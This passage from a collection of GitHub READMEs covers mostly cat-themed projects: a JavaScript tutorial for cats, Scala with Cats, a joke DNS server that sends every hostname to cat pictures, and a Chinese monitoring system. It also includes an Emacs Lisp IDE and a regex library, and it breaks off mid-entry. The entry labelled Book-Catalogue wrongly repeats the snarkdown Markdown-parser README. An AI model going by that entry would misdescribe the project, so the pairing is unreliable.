bit today\", name: \"Charles\" }\nBut the computer could give it back to you like this:\n{ diary: \"slept a bit today\", name: \"Charles\", date: \"10/20/2012\" }\nOr like this!\n{ name: \"Charles\", diary: \"slept a bit today\", date: \"10/20/2012\" }\nSo you can't ever trust the order of keys in objects. If you wanna get REALLY fancy you can make an array filled with objects, or an object filled with arrays!\nvar moodLog = [\n  {\n    date: \"10/20/2012\",\n    mood: \"catnipped\"\n  }, \n  {\n    date: \"10/21/2012\",\n    mood: \"nonplussed\"\n  },\n  {\n    date: \"10/22/2012\",\n    mood: \"purring\"\n  }\n]\n\n// ordered from least to most favorite\nvar favorites = {\n  treats: [\"bird sighting\", \"belly rub\", \"catnip\"],\n  napSpots: [\"couch\", \"planter box\", \"human face\"]\n}\nWhen you combine different things like this you are making data structures, just like legos!\n# Callbacks\nCallbacks aren't really a feature of JavaScript like Object or Array, but instead just a certain way to use functions. To understand why callbacks are useful you first have to learn about asynchronous (often shortened to async) programming. Asynchronous code by definition is code written in a way that is not synchronous. Synchronous code is easy to understand and write. Here is an example to illustrate:\nvar photo = download('http://foo-chan.com/images/sp.jpg')\nuploadPhotoTweet(photo, '@maxogden')\nThis synchronous pseudo-code downloads an adorable cat photo and then uploads the photo to twitter and tweets the photo at @maxogden. Pretty straightforward!\n(Author's note: I @maxogden do happily accept random cat photo tweets)\nThis code is synchronous because in order for photo to get uploaded to the tweet, the photo download must be completed. This means that line 2 cannot run until the task on line 1 is totally finished. If we were to actually implement this pseudo-code we would want to make sure that download 'blocked' execution until the download was finished, meaning it would prevent any other JavaScript from being executed until it finished, and then when the download completes it would un-block the JavaScript execution and line 2 would execute.\nSynchronous code is fine for things that happen fast, but it's horrible for things that require saving, loading, downloading or uploading. What if the server you're downloading the photo from is slow, or the internet connection you are using is slow, or the computer you are running the code on has too many youtube cat video tabs open and is running slowly? It means that it could potentially take minutes of waiting before line 2 gets around to running. Meanwhile, because all JavaScript on the page is being blocked from being run while the download is happening, the webpage would totally freeze up and become unresponsive until the download is done.\nBlocking execution should be avoided at all costs, especially when doing so makes your program freeze up or become unresponsive. Let's assume the photo above takes one second to download. To illustrate how long one second is to a modern computer, here is a program that tests to see how many tasks JavaScript can process in one second.\nfunction measureLoopSpeed() {\n  var count = 0\n  function addOne() { count = count + 1 }\n\n  // Date.now() returns a big number representing the number of\n  // milliseconds that have elapsed since Jan 01 1970\n  var now = Date.now()\n\n  // Loop until Date.now() is 1000 milliseconds (1 second) or more into\n  // the future from when we started looping. On each loop, call addOne\n  while (Date.now() - now < 1000) addOne()\n  \n  // Finally it has been >= 1000ms, so let's print out our total count\n  console.log(count)\n}\n\nmeasureLoopSpeed()\nCopy-paste the above code into your JavaScript console and after one second it should print out a number. On my computer I got 8527360, approximately 8.5 million. In one second JavaScript can call the addOne function 8.5 million times! So if you have synchronous code for downloading a photo, and the photo download takes one second, it means you are potentially preventing 8.5 million operations from happening while JavaScript execution is blocked.\nSome languages have a function called sleep that blocks execution for some number of seconds. For example here is some bash code running in Terminal.app on Mac OS that uses sleep. When you run the command sleep 3 && echo 'done sleeping now' it blocks for 3 seconds before printing out done sleeping now.\n\nJavaScript doesn't have a sleep function. Since you are a cat you are probably asking yourself, \"Why am I learning a programming language that does not involve sleeping?\". But stay with me. Instead of relying on sleep to wait for things to happen the design of JavaScript encourages use of functions instead. If you have to wait for task A to finish before doing task B, you put all of the code for task B into a function and you only call that function when A is done.\nFor example, this is blocking-style code:\na()\nb()\nAnd this is in a non-blocking style:\na(b)\nIn the non-blocking version b is a callback to a. In the blocking version a and b are both called/invoked (they both have () after them which executes the functions immediately). In the non-blocking version you will notice that only a gets invoked, and b is simply passed in to a as an argument.\nIn the blocking version, there is no explicit relationship between a and b. In the non-blocking version it becomes a's job to do what it needs to do and then call b when it is done. Using functions in this way is called callbacks because your callback function, in this case b, gets called later on when a is all done.\nHere is a pseudocode implementation of what a might look like:\nfunction a(done) {\n  download('https://pbs.twimg.com/media/B4DDWBrCEAA8u4O.jpg:large', function doneDownloading(error, png) {\n    // handle error if there was one\n    if (err) console.log('uh-oh!', error)\n    \n    // call done when you are all done\n    done()\n  })\n}\nThink back to our non-blocking example, a(b), where we call a and pass in b as the first argument. In the function definition for a above the done argument is our b function that we pass in. This behavior is something that is hard to wrap your head around at first. When you call a function, the arguments you pass in won't have the same variable names when they are in the function. In this case what we call b is called done inside the function. But b and done are just variable names that point to the same underlying function. Usually callback functions are labelled something like done or callback to make it clear that they are functions that should be called when the current function is done.\nSo, as long as a does it's job and called b when it is done, both a and b get called in both the non-blocking and blocking versions. The difference is that in the non-blocking version we don't have to halt execution of JavaScript. In general non-blocking style is where you write every function so that it can return as soon as possible, without ever blocking.\nTo drive the point home even further: If a takes one second to complete, and you use the blocking version, it means you can only do one thing. If you use the non-blocking version (aka use callbacks) you can do literally millions of other things in that same second, which means you can finish your work millions of times faster and sleep the rest of the day.\nRemember: programming is all about laziness and you should be the one sleeping, not your computer.\nHopefully you can see now that callbacks are just functions that call other functions after some asynchronous task. Common examples of asynchronous tasks are things like reading a photo, downloading a song, uploading a picture, talking to a database, waiting for a user to hit a key or click on someone, etc. Anything that takes time. JavaScript is really great at handling asynchronous tasks like these as long as you take the time to learn how to use callbacks and keep your JavaScript from being blocked.\nThe end!\nThis is just the beginning of your relationship with JavaScript! You can't learn it all at once, but you should find what works for you and try to learn all of the concepts here.\nI'd recommend coming back again tomorrow and going through the entire thing again from the beginning! It might take a few times through before you get everything (programming is hard). Just try to avoid reading this page in any rooms that contain shiny objects . . . they can be incredibly distracting.\nGot another topic you wanna see covered? Open an issue for it on github.\n# Recommended reading\nJavaScript For Cats skips over lots of details that aren't important for getting started (cats are not known for their attention spans), but if you feel like you need to dive in deeper then check these out:\n\nNodeSchool.io is a community driven, open source educational software that teaches various web development skills in an interactive, self-guided format. I helped make NodeSchool! Sadly it features fewer cats than this page.\nEloquent Javascript is a free book that teaches you JavaScript! It's pretty good! Especially the chapter on values, variables, and control flow\nMozilla's JavaScript Guide also has a pretty sweet intro chapter called values, variables and literals\nstandard JS Style Guide is a \"zero configuration\" linter for JS style that I use\nLet's Write Code by @shama a great series of YouTube coding tutorials made by a friend of mine\n\n\n### # Satisfied customers\n![satisfied customer](images/customers5.jpg)\n![satisfied customer](images/customers1.png)\n![satisfied customer](images/customers2.png)\n![satisfied customer](images/customers3.png)\n![satisfied customer](images/customers4.png)\nJSForCats.com is a labor of love and work in progress by @maxogden. If you would like to contribute and make this tutorial better there is a Github repo right over here.\n![console](images/awesome.jpg)"}, {"title": "underscoreio/scala-with-cats", "language": "TeX", "content": "Scala with Cats\nCopyright Noel Welsh\nand Dave Gurnell, 2014-2017.\nArtwork by Jenny Clements.\nPublished by Underscore Consulting LLP.\nThis work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.\nOverview\nScala with Cats teaches\ncore functional abstractions of monoids, functors, monads, and applicative functors\nusing the Cats library and a number of case studies.\nBuilding\nScala with Cats uses Underscore's ebook build system.\nThe simplest way to build the book is to use Docker Compose:\n\n\ninstall Docker Compose (brew install docker-compose on OS X;\nor download from docker.com); and\n\n\nrun go.sh (or docker-compose run book bash if go.sh doesn't work).\n\n\nThis will open a bash shell running inside the Docker container\nthat contains all the dependencies to build the book.\nFrom the shell run:\n\nnpm install; and then\nsbt.\n\nWithin sbt you can issue the commands\npdf, html, epub, or all\nto build the desired version(s) of the book.\nTargets are placed in the dist directory.\nContributing\nIf you spot a typo or mistake,\nplease feel free to fork the repo and submit a Pull Request.\nAdd yourself to src/pages/intro/contributors.md\nto ensure we credit you for your contribution.\nIf you don't have time to submit a PR\nor you'd like to suggest a larger change\nto the content or structure of the book,\nplease raise an issue instead."}, {"title": "notwaldorf/cat-dns", "language": "JavaScript", "content": "cat-dns\nThe Internet needs more cats. DNS servers are the authority on all things Internet. Therefore, the best DNS server is the one that resolves everthing to cats. Guess what kind of DNS server this is (Hint: it's the cat kind).\nMaking it go\nBefore you do anything, you need to install node packages:\nnpm install\n\nTo run, start the server as a privileged process. This is because to be a DNS server, you need to be a UDP server on port 53. This is a small numbered port, which means it needs superpowers (however, these are dumped once started). This is how you run it:\nsudo node cat-dns.js\n\nBy default, cat-dns will run attached to the localhost address. To bind this to a specific IP address on your host run:\nsudo node cat-dns.js --address 192.168.1.10\n\nBe careful running this on network addresses other than localhost. Other\nmachines with access to the host you bind to can make DNS queries. For\ninstance, binding to 0.0.0.0 and exposing your machine to the Internet\nwill allow anyone with access to the Internet to make DNS queries to your\nmachine.\nTo run on your local system, you need to somehow set your DNS server to be localhost. On a Mac, I do this by creating a new (Wi-Fi) interface (called Cats), in my Network preferences, and set its DNS server to 127.0.0.1. You could do this on your normal interface, but as a warning, while you're playing with this, pretty much nothing on your computer that requires the Internet works. Except for your browser. And then that's mostly cats. So being able to deactivate it easily is kind of key (I know. You might think 'Why would I ever want to deactivate cats?', but trust me on this one). I also recommend killing all the things that need to call the mothership (Google hangouts, Twitter feeds, Dropbox, iMessage), because they will not like your sassy cat answers, and will slow everything down.\nYou are ready\nGo in your browser to www.google.com and wait a bit. You should see a cat. Go to a different website. Another cat. Congratulations. Your Internet is now all cats.\nWait what?\nDo not panic. While I recommend you don't look at the source because it's gross, if you do look at the source, you'll notice all it does is resolve any hostname to 104.131.51.57 (or whatever cats.nanobit.org actually resolves to, as it keeps changing), which is a magical place on the Internet that has cats. You could also resolve everything to localhost, and serve your own cats on an HTTP server on port 80. But then you'd have to store your own cats locally, and that is animal cruelty. Thankfully, for now, while that magical static IP exists, you don't have to.\nThat's it, that's all.\n<3,\nmonica"}, {"title": "unidal/cat2", "language": "JavaScript", "content": "CAT \n\n\n===\nCAT(Central Application Tracking)\u662f\u57fa\u4e8eJava\u5f00\u53d1\u7684\u5206\u5e03\u5f0f\u5b9e\u65f6\u76d1\u63a7\u7cfb\u7edf\uff0c\u4e3b\u8981\u5305\u62ec\u5e94\u7528\u76d1\u63a7\u3001\u4e1a\u52a1\u76d1\u63a7\u7b49\u3002[2013-01-06]\nCAT\u652f\u6301\u4ee5\u4e0b\u6d88\u606f\u7c7b\u578b\u76d1\u63a7\uff1a\n\nTransaction \u9002\u5408\u8bb0\u5f55\u8de8\u8d8a\u7cfb\u7edf\u8fb9\u754c\u7684\u7a0b\u5e8f\u8bbf\u95ee\u884c\u4e3a,\u6bd4\u5982\u8fdc\u7a0b\u8c03\u7528\uff0c\u6570\u636e\u5e93\u8c03\u7528\uff0c\u4e5f\u9002\u5408\u6267\u884c\u65f6\u95f4\u8f83\u957f\u7684\u4e1a\u52a1\u903b\u8f91\u76d1\u63a7\uff0cTransaction\u7528\u6765\u8bb0\u5f55\u4e00\u6bb5\u4ee3\u7801\u7684\u6267\u884c\u65f6\u95f4\u548c\u6b21\u6570\u3002\nEvent \u7528\u6765\u8bb0\u5f55\u4e00\u4ef6\u4e8b\u53d1\u751f\u7684\u6b21\u6570\uff0c\u6bd4\u5982\u8bb0\u5f55\u7cfb\u7edf\u5f02\u5e38\uff0c\u5b83\u548ctransaction\u76f8\u6bd4\u7f3a\u5c11\u4e86\u65f6\u95f4\u7684\u7edf\u8ba1\uff0c\u5f00\u9500\u6bd4transaction\u8981\u5c0f\u3002\nHeartbeat \u8868\u793a\u7a0b\u5e8f\u5185\u5b9a\u671f\u4ea7\u751f\u7684\u7edf\u8ba1\u4fe1\u606f, \u5982CPU%, MEM%, \u8fde\u63a5\u6c60\u72b6\u6001, \u7cfb\u7edf\u8d1f\u8f7d\u7b49\u3002\nMetric  \u7528\u4e8e\u8bb0\u5f55\u4e1a\u52a1\u6307\u6807\u3001\u6307\u6807\u53ef\u80fd\u5305\u542b\u5bf9\u4e00\u4e2a\u6307\u6807\u8bb0\u5f55\u6b21\u6570\u3001\u8bb0\u5f55\u5e73\u5747\u503c\u3001\u8bb0\u5f55\u603b\u548c\uff0c\u4e1a\u52a1\u6307\u6807\u6700\u4f4e\u7edf\u8ba1\u7c92\u5ea6\u4e3a1\u5206\u949f\u3002\nTrace \u7528\u4e8e\u8bb0\u5f55\u57fa\u672c\u7684trace\u4fe1\u606f\uff0c\u7c7b\u4f3c\u4e8elog4j\u7684info\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u4ec5\u7528\u4e8e\u67e5\u770b\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\n\n\u6d88\u606f\u6811\nCAT\u76d1\u63a7\u7cfb\u7edf\u5c06\u6bcf\u6b21\u7528\u6237\u8bf7\u6c42(URL)\u3001\u670d\u52a1\u8c03\u7528(Service)\u548c\u6570\u636e\u5e93\u8bbf\u95ee(SQL)\u7b49\u5185\u90e8\u6267\u884c\u6b65\u9aa4\u5c01\u88c5\u6210\u4e00\u4e2a\u5b8c\u6574\u7684\u6d88\u606f\u6811(\u7531Transaction\u3001Event\u3001Heartbeat\u3001Metric\u548cTrace\u7b49\u6d88\u606f\u7ec4\u6210)\uff0c\u5448\u73b0\u51fa\u6765\uff0c\u65b9\u4fbf\u7528\u6237\u8fdb\u884c\u6545\u969c\u8bca\u65ad\u548c\u6027\u80fd\u8c03\u4f18\u3002\n\u5b8c\u6574\u7684\u6d88\u606f\u6811\n\n\u53ef\u89c6\u5316\u6d88\u606f\u6811\n\n\u5206\u5e03\u5f0f\u6d88\u606f\u6811\u3010\u4e00\u53f0\u673a\u5668\u8c03\u7528\u53e6\u5916\u4e00\u53f0\u673a\u5668\u3011\n\nRequirements\n\nJava 6+\nMaven 3.2.1+\nMySQL 5.6+\n\nQuick Started\n#####1\u3001\u5728CAT\u76ee\u5f55\u4e0b\uff0c\u7528maven\u6784\u5efa\u9879\u76ee\nmvn clean install -DskipTests\n#####2\u3001\u914d\u7f6eCAT\u7684\u73af\u5883\nmvn cat:install\nNote\uff1a\n\nLinux\\Mac  \u9700\u8981\u5bf9/data/appdatas/cat\u548c/data/applogs/cat\u6709\u8bfb\u5199\u6743\u9650\nWindows    \u5219\u662f\u5bf9\u7cfb\u7edf\u8fd0\u884c\u76d8\u4e0b\u7684/data/appdatas/cat\u548c/data/applogs/cat\u6709\u8bfb\u5199\u6743\u9650\n\n#####3\u3001(Optional)\u5982\u679c\u5b89\u88c5\u4e86hadoop\u96c6\u7fa4\uff0c\u9700\u5230/data/appdatas/cat/server.xml\u4e2d\u914d\u7f6e\u5bf9\u5e94hadoop\u4fe1\u606f\u3002\u5c06localmode\u8bbe\u7f6e\u4e3afalse\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cCAT\u5728\u5f00\u53d1\u6a21\u5f0f\uff08localmode=true\uff09\u4e0b\u5de5\u4f5c\u3002\n#####4\u3001\u8fd0\u884cCAT\ncd cat-home;mvn jetty:run\n\u7136\u540e\u6253\u5f00\u6d4f\u89c8\u5668\uff0c\u8f93\u5165http://localhost:2281/cat/\u3002\n\u6216\u8005\u5728cat\u76ee\u5f55\u4e0b\u8f93\u5165\nmvn eclipse:clean eclipse:eclipse\n\u7136\u540e\u5c06\u9879\u76ee\u5bfc\u5165\u5230eclipse\u4e2d\uff0c\u8fd0\u884ccat-home\u9879\u76ee\u91cc\u5f97\u2018com.dianping.cat.TestServer\u2019\u6765\u542f\u52a8CAT\u3002\nCopyright and license\nCopyright 2013 DianPing, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\"); you may not use this work except in compliance with the License. You may obtain a copy of the License in the LICENSE file, or at:\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.\nCAT\u63a5\u5165\u516c\u53f8\n\n\n\u66f4\u591a\u63a5\u5165\u516c\u53f8\uff0c\u6b22\u8fce\u5728https://github.com/dianping/cat/issues/753\u767b\u8bb0"}, {"title": "Externalizable/bongo.cat", "language": "JavaScript", "content": "Bongo Cat\n\n\n\nHit the bongos like Bongo Cat! https://bongo.cat\nAbout the meme\nBongo Cat is a meme created by DitzyFlama (tweet) using StrayRogue's drawing of a cat.\nSong Examples\nHappy Birthday to You\n\n1 1 3 1 6 5\n1 1 3 1 8 6\n\nOde to Joy - Friedrich Schiller\n\n5 5 6 8 8 6 5 3 1 1 3 5 5 3 3\n5 5 6 8 8 6 5 3 1 1 3 5 3 1 1\n3 3 5 1 3 5 6 5 1 3 5 6 5 3 1 3 1\n\nIn the End - Linkin Park\n\n3 0 0 6 5 5 5 5 6 3\n0 0 6 5 5 5 5 6 3\nC\nSpace\n0 0 6 5 5 5 5 6 3\n0 0 6 5 5 5 5 6 3\nC\n\nCome as You Are - Nirvana\n\n1 1 2 3\n6 3 6 3 3 2 1 5 1 1 6 1 1 2 3\n\nGet creative and submit your own!\nFeatured in\n\nTweet by StrayRogue, the creator of the cat drawing (15th September 2018)\nTweet by DitzyFlama, the original creator of the meme (15th September 2018)\nYouTubers React To Bongo Cat Meme Compilation on YouTube, posted by FBE (2nd October 2018)\nBored Button website (Date unknown)\n\nPermission\nStrayRogue gave written permission to @Externalizable on the 15th September 2018 to use their drawing on the Bongo Cat website.\nBuilt with\n\nlowLag.js - To play lag free sounds on a wide range of devices\nSoundManager 2 - Used by lowLag.js\n\nAuthors\n\nStrayRogue - Cat drawing\nDitzyFlama - Original idea\nExternalizable - Website & domain\n\nSee also the list of contributors who participated in this project.\nLicense\nThis project is licensed under the MIT License - see the LICENSE file for details"}, {"title": "rancher/rancher-catalog", "language": "Smarty", "content": "Rancher Catalog\nIn Rancher, one of the two automatically packaged catalogs is this repository and the community-catalog.\nBranches\nIf you are running Rancher v1.6.1+, the library catalog points to a git mirror of the v1.6-release branch of this repo.\nIf you are running Rancher v1.6.0 and lower,  the library catalog points to a git mirror of the v1.6-release branch of this repo.\nBranches before a Release\nWhen developing and testing new templates, a new dev branch for the upcoming release is created and packaged in our rancher/server:master container. For example, when we are developing and testing for v1.6.0, a v1.6.0-dev branch is created. Any PRs with changes should be made to this dev branch.\nEach Rancher RC is packaged with a specific branch to isolate what specific versions of templates were tested. The RC branch are created from the current dev branch at the time of cutting the RC. If there are fixes that need to be made to address the templates, they should always be made to the dev branch. QA will pick up the dev branch for their RCs, if there are known issues in the specific branch packaged for the RC.\n\nNote: Branches for specific RCs may be deleted in the future, as Rancher does not maintain the RCs.\n\nBefore an official Rancher release is created, a PR will be made to bring all changes from the dev branch to the master branch. The commits will be squashed into the 1 commit.\nBranches after a Release\nAfter the dev branch of a release has been merged to master and Rancher has been released, the first patch release will have  a branch created based on master. All following RCs for the patch release would be based on the previous RC until the patch release was completed. And then the cycle would start again.\n\nExample: Rancher releases v1.5.0. If Rancher is starting to test for Rancher v1.5.1, the first RC branch will be made from master, which would be v1.5.1-rc1. Any changes for the releases would be made into this branch. For the next RC, a new branch (i.e. v1.5.1-rc2) will be created from v1.5.1-rc1. This would continue until we release Rancher, where the last RC branch for the patch release would be merged into the master branch. While the v1.5.1 RCs are being created, there would be a v1.6.0-dev branch, which would contain changes for Rancher v1.6.0.\n\nTemplate Versions\nWhen making changes to a template into an existing catalog, compare the current dev branch with the master branch to see if a new folder needs to be created.\n\nCheck to see if a new folder is needed in the dev branch. We are trying to maintain only 1 new template for each release as it will be the new default version for Rancher.\n\nIf the folders are the same in the dev and master branch are the same, then a new folder will need to be created. This new folder is created to add in the new template changes that are being introduced in the latest version of Rancher.\n\nCreate a base copy of the latest default.\nDetermine what the current default version of the catalog is. IT IS NOT GUARANTEED TO BE THE LATEST FOLDER. Go to the config.yml of the template to find the version number. Find the corresponding template folder that has this version.\n\n\n\n\n\n\nExample of Folder Alignment: Folder 0 contains version v0.1.0 for Rancher 1.1. Folder 1 contains version v0.2.0 for Rancher 1.2, but this template is not compatible with Rancher 1.1. A fix needs to be made for Rancher 1.1, so a new folder 2 is created and contains version v0.1.2 which is for Rancher 1.1, but will not be the default version for Rancher 1.2.\n3. Copy the folder and commit the change as Base copy of folder X\n2. If there is already new folder in the dev branch that is not in the master branch, use the new folder in the dev branch. All changes for a template would go in the same folder during a release cycle. Upgrade testing will always be done from the previous Rancher version, which would contain a template in a different folder.\n\n\n\nMake changes to the template.\n\n\nUpdate the version of the template in the rancher-compose.yml\na. When introducing a new folder, the minor version should be increased. If the previous version was v0.3.1, it should now be v0.4.0.\nb. When using an existing folder in the dev branch, which would occur only after a new folder had been introduced for that release cycle, the patch version should be increased. If the current version in the new folder is v0.4.0, then it should be v0.4.1.\n\n\n\nExample: We made a change in the scheduler. There is no new difference in folders for master and dev, so we introduced folder 2. The previous version of the template was v0.2.0, so the new version v0.3.0 is for the new folder. During testing, more changes needed to be made to scheduler. Since we are still in the same Rancher release, we would continue to re-use folder 2. The next template version with changes would be v0.3.1.\n\n\nIf the version will be the latest default in the upcoming release, update the version in the config.yml\n\nRancher Versions\nWhen creating new templates of a catalog, please review the minimum_rancher_version: in the rancher-compose.yml to confirm that it's accurate. Due to resourcing, Rancher is generally only able to test out 1 version of a infrastructure service for a release. Therefore, the new folder should have a minimum_rancher_version of the release that it is being introduced for. Also, any old templates should be reviewed and a maximum_rancher_version of the previous release should be used.\n\nExample: We are working on Rancher v1.6 on the v1.6.0-dev branch. When introducing any new folders/versions templates, we should update the minimum_rancher_version to be v1.6.0-rc1. In any old folder, we should add in maximum_rancher_version and set it at v1.5.99 to indicate those versions are only for the v1.5.X release.\n\nContact\nFor bugs, questions, comments, corrections, suggestions, etc., open an issue in\nrancher/rancher with a title starting with [rancher-catalog] .\nOr just click here to create a new issue.\nLicense\nCopyright (c) 2014-2015 Rancher Labs, Inc.\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "joaotavora/sly", "language": "Common Lisp", "content": "_____    __   __  __        \n         / ___/   / /   \\ \\/ /               |\\      _,,,---,,_\n         \\__ \\   / /     \\  /                /,`.-'`'    -.  ;-;;,_\n        ___/ /  / /___   / /                |,4-  ) )-,_..;\\ (  `'-'\n       /____/  /_____/  /_/                '---''(_/--'  `-'\\_)\n\nSLY is Sylvester the Cat's Common Lisp IDE for Emacs:\n\n\ud83e\udd14 Read a short illustrated guide\n\ud83d\udcfd\ufe0f Scroll down this README for some pretty gifs\n\ud83d\udce3 Read the NEWS file\n\ud83d\udcda Read the manual\n\nSLY is a fork of SLIME and contains the following improvements upon\nit:\n\nCompletely redesigned REPL based on Emacs's own full-featured\ncomint.el;\nLive code annotations via a new sly-stickers contrib;\nConsistent interactive button interface.  Everything can be copied to the\nREPL;\nModern flex-style completion.  Much snappier when\nusing company, and no plugin required;\nCleanly ASDF-loaded be default, including contribs, which are enabled\nout-of-the-box;\nMultiple inspectors;\nSupport for NAMED-READTABLES, macrostep.el and quicklisp\n\nSLY tracks SLIME's bugfixes.  All its familar features (debugger, inspector,\nxref, etc...) are still available, with improved overall UX.\nInstallation\nEnsure that MELPA is setup as usual and ask M-x package-install to\ninstall the package sly.\nThat's it. sly-mode will automatically come up in every .lisp file. To\nfire up SLY, connect to a Lisp and get a friendly REPL, use M-x sly.\nEven if you already have SLIME installed, SLY will ask you and temporarily\ndisable it for the Emacs session.\n\nObligatory animated gif section\n\nFlex completion\n\n\nBackreferences\n\nReverse i-search\n\n\nStickers\n\nInstall from git\nClone this repository, add this to your ~/.emacs file and fill in the\nappropriate file names:\n(add-to-list 'load-path \"~/dir/to/cloned/sly\")\n(require 'sly-autoloads)\n(setq inferior-lisp-program \"/opt/sbcl/bin/sbcl\")\nIf you wish to byte-compile SLY yourself (not needed generally) you can do make compile compile-contrib in the dir where you cloned SLY.\nRunning the server standalone\nThis also works\n$ sbcl\n...\n* (push #p\"~/dir/to/sly\" asdf:*central-registry*)\n* (asdf:load-system :slynk)\n* (slynk:create-server :port 4008)\n\nNow in Emacs you can do sly-connect and give it the host and the 4008 port as\na destination.\nLicense\nSLY is free software. All files, unless explicitly stated otherwise, are\npublic domain. ASCII artwork is copyright by Felix Lee and others.\nFork\nSLIME is the work of Eric Marsden, Luke Gorrie, Helmut Eller, Tobias\nC. Rittweiler and many others. I forked SLIME because I used it daily,\nfor work, had a long list of hacks developed for myself, and wanted to share\nthem with others.\nIn 2013, SLIME development was stalling, patches and issues rotting. In early\n2014,  Lu\u00eds Oliveira and myself moved SLIME to Github and set up its Travis CI\nsystem. I brought in the old bug reports from the Launchpad tracker, fixed\nlong-standing problems and submitted many changes, particularly to the\nunder-curated but popular \"contrib\" section.\nNow, the changes that SLY brings to the table are too deep at the Elisp and Lisp\nlevel to be accepted to SLIME, given its current focus on stability (for the\nrecord, I find this perfectly reasonable). The new features, such as stickers or\nmultiple inspectors, cannot be realized well using only the existing \"contrib\"\nsystem.  Finally, SLY frees itself from the shackles of Emacs 23 and supports\nEmacs 24.3+ only, allowing for much cleaner code and liberal use of lexical\nbinding.\nThe list of technical reasons is bigger than this though, and you can read up on\nthem in the CONTRIBUTING.md file.\nContributing\nOpen an issue or a pull request, but at least have a quick look at the\nfirst part CONTRIBUTING.md file for instructions on how to contribute."}, {"title": "developit/snarkdown", "language": "JavaScript", "content": "Snarkdown is a dead simple 1kb Markdown parser.\nIt's designed to be as minimal as possible, for constrained use-cases where a full Markdown parser would be inappropriate.\nFeatures\n\nFast: since it's basically one regex and a huge if statement\nTiny: it's 1kb of gzipped ES3\nSimple: pass a Markdown string, get back an HTML string\n\n\nNote: Tables are not yet supported. If you love impossible to read regular expressions, submit a PR!\n\nDemos & Examples\n\n\u269b\ufe0f Snarky - markdown editor built with Preact & Snarkdown\n\u270f\ufe0f Simple Markdown Editor\n\nUsage\nSnarkdown exports a single function, which parses a string of Markdown and returns a String of HTML. Couldn't be simpler.\nThe snarkdown module is available in every module format you'd ever need: ES Modules, CommonJS, UMD...\nimport snarkdown from 'snarkdown';\n\nlet md = '_this_ is **easy** to `use`.';\nlet html = snarkdown(md);\nconsole.log(html);\n// <em>this</em> is <strong>easy</strong> to <code>use</code>.\nLicense\nMIT"}, {"title": "eleybourn/Book-Catalogue", "language": "Java", "content": "Snarkdown is a dead simple 1kb Markdown parser.\nIt's designed to be as minimal as possible, for constrained use-cases where a full Markdown parser would be inappropriate.\nFeatures\n\nFast: since it's basically one regex and a huge if statement\nTiny: it's 1kb of gzipped ES3\nSimple: pass a Markdown string, get back an HTML string\n\n\nNote: Tables are not yet supported. If you love impossible to read regular expressions, submit a PR!\n\nDemos & Examples\n\n\u269b\ufe0f Snarky - markdown editor built with Preact & Snarkdown\n\u270f\ufe0f Simple Markdown Editor\n\nUsage\nSnarkdown exports a single function, which parses a string of Markdown and returns a String of HTML. Couldn't be simpler.\nThe snarkdown module is available in every module format you'd ever need: ES Modules, CommonJS, UMD...\nimport snarkdown from 'snarkdown';\n\nlet md = '_this_ is **easy** to `use`.';\nlet html = snarkdown(md);\nconsole.log(html);\n// <em>this</em> is <strong>easy</strong> to <code>use</code>.\nLicense\nMIT"}, {"title": "bendytree/Objective-C-RegEx-Categories", "language": "Objective-C", "content": "Objective-C RegEx Categories\n\n\nIntroduction\nGetting Started\n\nCocoa Pods\nDownload\nSwift Support\n\n\nQuick Examples\nDocumentation\n\nMacros\nCreation\nTest If Match\nIndex Of Match\nSplit\nFirst Match\nMatches\nReplace\nRxMatch Objects\n\n\nSupport\nLicensing\nTesting\nAlternatives\nWho Uses It\n\n\n## Introduction\nThis project simplifies regular expressions in Objective-C and Swift.\nAs of iOS 4 (and OSX 10.7), NSRegularExpression is built-in to Foundation.framework. The syntax is somewhat cumbersome and it leaves much of the work to you, so this library creates categories and macros to simplify usage of NSRegularExpression.\nHere is an example where four lines of code become one:\n// Without this library\nNSString* string = @\"I have 2 dogs.\";\nNSRegularExpression *regex = [NSRegularExpression regular ExpressionWithPattern:@\"\\\\d+\" options:NSRegularExpressionCaseInsensitive error:&error];\nNSTextCheckingResult *match = [regex firstMatchInString:string options:0 range:NSMakeRange(0, [string length])];\nBOOL isMatch = match != nil;\n\n// With this library\nBOOL isMatch = [@\"I have 2 dogs.\" isMatch:RX(@\"\\\\d+\")];\nTIP: Refer to the header (RegExCategories.h) for more details and examples.\n\n## Getting Started\nThis library has no dependencies and works for iOS 4+ and OSX 10.7+.\n\n### Installing Via CocoaPods\nIf you use Cocoa Pods, then just add the following to your Podfile. Then run pod install from the command line.\npod 'RegExCategories', '~> 1.0'\n\n\n### Installing Via Download\nYou can also just copy these two files into your project:\n\nRegExCategories.h\nRegExCategories.m\n\nYou may want to add it to your [AppName]-Prefix.pch so that is is available across your code base.\n#ifdef __OBJC__\n    /* ...other references... */\n    #import \"RegExCategories.h\"\n#endif\nYou also need to have  ARC enabled on your Xcode project. If you don't then add the -fobjc-arc flag on RegExCategories.m under Targets > Build Phases > Compile Sources (more info).\n\n### Swift Support\nYou can use these extensions in Swift. There are additional steps you must take to use Objective-C code from Swift. Once you've installed via Cocoa Pods or via download, do the following:\n\n\nAdd a Bridging Header\nThis file will allow you to use objective-c code from your .swift code. Create an objective-c header file named [YourProjectName]-Bridging-Header.h\n\n\nConfigure The Bridging Header\nIn the Build Settings of your main project, scroll down to the \"Swift Compiler - Code Generation\" section. In \"Objective-C Bridging Header\" add your file. Typically your value will be [YourProjectName]/[YourProjectName]-Bridging-Header.h.  Build your project - if you have errors then you've set the wrong path.\n\n\nImport RegExCategories\nIn your bridging header, import the header for this library. For example, if you use Cocoa Pods it may look like this:\n#import <RegExCategories/RegExCategories.h>\n\nIf you just copied the files in to your project, it may look like this:\n#import 